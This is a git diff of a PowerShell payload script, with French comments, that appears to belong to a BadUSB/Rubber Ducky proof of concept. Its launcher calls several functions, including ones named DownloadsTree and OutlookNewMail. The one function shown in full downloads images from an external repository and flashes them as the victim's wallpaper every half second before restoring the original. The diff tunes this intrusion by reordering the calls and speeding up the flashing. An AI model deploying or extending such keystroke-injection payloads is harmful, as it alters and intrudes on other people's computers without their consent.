@@ -1,10 +1,10 @@
 function Payload_Launch {
 
+    CreateWarningSlideshow
     OpenNotepad
     DownloadsTree
     OutlookNewMail
     FileShow
-    CreateWarningSlideshow
 
 }
 
@@ -35,25 +35,30 @@ function OpenNotepad {
 function CreateWarningSlideshow {
     # Prendre le nom d'utilisateur et le stocker
     $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    
     # Chemin du dossier "WARNING" sur le bureau
     $desktopPath = [Environment]::GetFolderPath('Desktop')
     $warningFolderPath = Join-Path $desktopPath "WARNING"
+    
     # Créer le dossier "WARNING" s'il n'existe pas
     if (-not (Test-Path $warningFolderPath)) {
         New-Item -Path $warningFolderPath -ItemType Directory | Out-Null
     }
+    
     # Prendre le fond d'écran actuel et le stocker dans le dossier "WARNING"
     $currentWallpaperPath = (Get-ItemProperty 'HKCU:\Control Panel\Desktop\' -Name WallPaper).WallPaper
     $currentWallpaperFilename = [System.IO.Path]::GetFileName($currentWallpaperPath)
     $backupWallpaperPath = Join-Path $warningFolderPath $currentWallpaperFilename
     Copy-Item -Path $currentWallpaperPath -Destination $backupWallpaperPath -ErrorAction SilentlyContinue
+    
     # URLs des images pour le diaporama
     $imageURLs = @(
-        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/1.jpeg",
-        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/2.jpg",
-        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/3.jpg",
-        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/4.jpg"
+        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/1.png",
+        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/2.png",
+        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/3.png",
+        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/4.png"
     )
+    
     # Télécharger les images dans le dossier "WARNING" avec l'extension correcte
     $downloadedImages = @()
     foreach ($url in $imageURLs) {
@@ -63,15 +68,17 @@ function CreateWarningSlideshow {
         Invoke-WebRequest -Uri $url -OutFile $destinationPath
         $downloadedImages += $destinationPath
     }
-    # Créer le fichier de configuration du diaporama avec un intervalle de 2 secondes pour chaque image
+    
+    # Créer le fichier de configuration du diaporama
     $slideshowConfig = @"
 [Slideshow]
-Interval=2
+Interval=0.5
 [Path]
 ${desktopPath}
 "@
     $slideshowConfigPath = Join-Path $warningFolderPath "slideshow.ini"
     Set-Content -Path $slideshowConfigPath -Value $slideshowConfig
+    
     # Mettre en place le diaporama comme fond d'écran
     Add-Type -TypeDefinition @"
 using System;
@@ -81,20 +88,23 @@ public class Wallpaper {
     public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 }
 "@
-    # Durée totale du diaporama en secondes (2 secondes par image, 4 images)
-    $totalDuration = 2 * $downloadedImages.Count  # 2 secs per picture * pictures number
-    # Loop for 1 minute (60 secondes)
-    $endTime = [DateTime]::Now.AddMinutes(1)
-    while ([DateTime]::Now -lt $endTime) {
+    
+    # Durée totale du diaporama en secondes (0.5 secondes par image)
+    $interval = 0.5
+    $totalDuration = 8
+    $iterations = [Math]::Ceiling($totalDuration / $interval)
+    
+    # Loop for the total duration
+    for ($i = 0; $i -lt $iterations; $i++) {
         foreach ($image in $downloadedImages) {
             [Wallpaper]::SystemParametersInfo(0x0014, 0, $image, 0x0001 -bor 0x0002)
-            Start-Sleep -Seconds 2
+            Start-Sleep -Seconds $interval
         }
     }
-    # Putting original Wallpaper as wallpaper again
+    
+    # Remettre le fond d'écran original
     [Wallpaper]::SystemParametersInfo(0x0014, 0, $backupWallpaperPath, 0x0001 -bor 0x0002)
 }
-
 
 
 function DownloadsTree {
